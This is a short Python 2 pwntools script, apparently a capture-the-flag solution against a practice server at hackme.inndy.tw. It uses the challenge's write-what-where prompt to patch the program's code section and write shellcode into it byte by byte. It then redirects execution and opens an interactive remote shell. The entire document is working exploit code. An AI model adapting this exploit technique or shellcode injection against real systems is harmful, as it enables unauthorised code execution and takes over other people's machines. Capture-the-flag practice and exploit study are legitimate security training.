#!/usr/bin/env python2

from pwn import *
import time

#context.log_level = 'debug'
context.arch = 'amd64'

base = 0x00400769

p = remote('hackme.inndy.tw', 7718)

p.sendlineafter('Where What?', '0x400768 -61')
time.sleep(0.5)
p.sendline('0x400763 -2')
sc = asm(shellcraft.sh())
for i in range(len(sc)):
    time.sleep(0.5)
    p.sendline(hex(base + i) + ' ' + str(ord(sc[i])))
    print '[+] Wrote %d bytes to .text' % (i + 1)

print '[+] Wrote shellcode to .text'
p.sendline('0x400700 254')

p.interactive()
p.close()
